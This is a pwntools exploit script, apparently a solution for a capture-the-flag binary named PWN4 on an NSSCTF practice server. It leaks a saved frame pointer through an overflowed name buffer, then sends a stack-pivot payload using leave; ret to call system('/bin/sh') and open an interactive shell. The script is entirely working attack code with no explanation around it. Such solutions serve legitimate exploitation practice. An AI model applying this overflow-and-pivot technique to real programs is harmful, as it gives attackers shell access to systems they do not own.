from pwn import *

context(os="linux", arch="i386", log_level="debug")
io = process("./PWN4")
#io = remote("node5.anna.nssctf.cn", 25943)
leave_ret = 0x8048562
system_plt = 0x8048400
leak = b'a'*(0x27) + b'B'

io.recvuntil("name?")
#gdb.attach(io)
io.send(leak)
io.recvuntil(b'B')
old_edp = u32(io.recv(4))
print(hex(old_edp))


## old_ebp和变量的距离为0x38
payload = b'a'*4 + p32(system_plt) + b'a'*4 + p32(old_edp - 0x28) + b'/bin/sh\x00'

payload = payload.ljust(0x28, b'\x00')
payload += p32(old_edp - 0x38) + p32(leave_ret)
io.recvuntil('\n')
io.send(payload)

io.interactive()